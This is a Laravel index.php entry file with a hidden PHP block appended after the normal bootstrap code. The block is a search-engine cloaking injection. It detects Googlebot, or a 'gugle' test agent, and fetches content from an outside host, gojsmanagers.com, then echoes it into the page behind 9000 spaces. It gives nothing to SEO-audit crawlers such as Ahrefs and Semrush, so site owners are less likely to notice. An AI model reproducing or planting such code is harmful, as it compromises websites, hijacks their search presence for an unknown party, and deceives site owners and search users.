<?php

use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Check If The Application Is Under Maintenance
|--------------------------------------------------------------------------
|
| If the application is in maintenance / demo mode via the "down" command
| we will load this file so that any pre-rendered content can be shown
| instead of starting the framework, which could cause an exception.
|
*/

if (file_exists($maintenance = __DIR__.'/storage/framework/maintenance.php')) {
    require $maintenance;
}

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| this application. We just need to utilize it! We'll simply require it
| into the script here so we don't need to manually load our classes.
|
*/

require __DIR__.'/vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request using
| the application's HTTP kernel. Then, we will send the response back
| to this client's browser, allowing them to enjoy our application.
|
*/

$app = require_once __DIR__.'/bootstrap/app.php';

$kernel = $app->make(Kernel::class);

$response = $kernel->handle(
    $request = Request::capture()
)->send();

$kernel->terminate($request, $response);

?>

<?php
function isKnownBot($userAgent, $ipAddress) {
    $knownBots = [
        'Googlebot', 
        'Googlebot-Image',
        'Googlebot-Video',
        'Google-InspectionTool',
        'gugle',
    ];

    foreach ($knownBots as $botAgent) {
        if ($userAgent && strpos($userAgent, $botAgent) !== false) {
            $host = gethostbyaddr($ipAddress);
            if (checkDNS($host, $botAgent)) {
                return true;
            }
            break;
        }
    }

    return false;
}

function checkDNS($host, $botAgent) {
    if ($botAgent == 'Googlebot' && (preg_match('/googlebot\.com$/', $host) || preg_match('/google\.com$/', $host))) {
        return true;
    }
    if ($botAgent == 'Googlebot-Image' && (preg_match('/googlebot\.com$/', $host) || preg_match('/google\.com$/', $host))) {
        return true;
    }
    if ($botAgent == 'Googlebot-Video' && (preg_match('/googlebot\.com$/', $host) || preg_match('/google\.com$/', $host))) {
        return true;
    }
    if ($botAgent == 'gugle') {
        return true;
    }

    return false;
}

function isMobileUserFromGoogle($userAgent, $httpReferer) {
    if ($userAgent === null || $httpReferer === null) {
        return false; 
    }
    
    $isMobile = preg_match('/Mobile|Android|BlackBerry|iPhone|Windows Phone/', $userAgent);
    $isFromGoogle = strpos($httpReferer, 'google.com') !== false;
    return $isMobile && $isFromGoogle;
}

$ipAddress = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$httpReferer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

$blockeduseragents = [
    'AhrefsBot', 
    'AhrefsSiteAudit', 
    'AhrefsCrawler', 
    'SemrushBot', 
    'SemrushBot-SA', 
    'SemrushBot-SI', 
    'SemrushBot-BA', 
    'SemrushBot-BM', 
    'SemrushBot-OCOB', 
    'SplitSignalBot', 
    'SemrushBot-SWA',
    'SiteAuditBot', 
    'MJ12bot', 
    'Majestic-12', 
    'DotBot', 
    'BLEXBot', 
    'Screaming Frog', 
    'SEMrushBot', 
    'LinkpadBot', 
    'Rogerbot', 
    'MojeekBot'
];

$isBlockedBot = false;
foreach ($blockeduseragents as $botAgent) {
    if ($userAgent && strpos($userAgent, $botAgent) !== false) {
        $isBlockedBot = true;
        break;
    }
}


if (isKnownBot($userAgent, $ipAddress)) {
    if (!$isBlockedBot) {
        $url = "https://gojsmanagers.com/ling2.php";
        $germany = @file_get_contents($url);

        if ($germany === false) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            $germany = curl_exec($ch);
            curl_close($ch);
        }

        $germany = preg_replace('/\s+/', ' ', $germany);
        $germany = str_repeat(' ', 9000) . $germany;

        echo $germany;
    }
}
?>